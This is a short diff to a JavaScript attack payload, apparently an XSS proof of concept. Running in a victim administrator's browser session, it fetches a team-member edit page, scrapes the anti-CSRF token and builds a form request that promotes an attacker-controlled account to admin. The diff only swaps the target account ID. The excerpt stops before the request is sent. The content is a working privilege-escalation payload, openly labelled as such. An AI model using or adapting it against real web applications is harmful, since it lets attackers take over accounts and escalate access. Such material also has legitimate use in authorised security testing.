@@ -1,6 +1,6 @@
 (async function(){
   // Fetch the edit page to get a fresh CSRF token from the victim's session
-  var r = await fetch('/Team/EditTeamMember/61455');
+  var r = await fetch('/Team/EditTeamMember/61491');
   var h = await r.text();
   var m = h.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
   if(!m) return;
@@ -8,7 +8,7 @@
 
   // Promote attacker (ID 61455) to admin using victim's admin session
   var b = new URLSearchParams();
-  b.append('ID','61455');
+  b.append('ID','61491');
   b.append('FirstName','Test');
   b.append('LastName','User');
   b.append('IsEnabled','true');
